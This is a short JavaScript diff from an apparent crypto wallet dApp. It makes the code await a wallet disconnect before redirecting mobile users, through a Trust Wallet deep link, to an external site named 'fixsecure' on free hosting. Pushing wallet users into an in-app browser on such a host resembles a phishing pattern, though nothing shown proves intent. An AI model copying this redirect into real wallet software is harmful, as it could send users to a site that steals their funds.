@@ -188,8 +188,12 @@ console.log(walletInfo?.name)
     isMobileDevice &&
     !isTrustWalletApp() // ensure we are not already inside the app
   ) {
-    disconnect()
-       window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
+   const run = async () => {
+      await disconnect(); // ✅ works correctly
+      window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
+    };
+
+    run();
     }
 
 
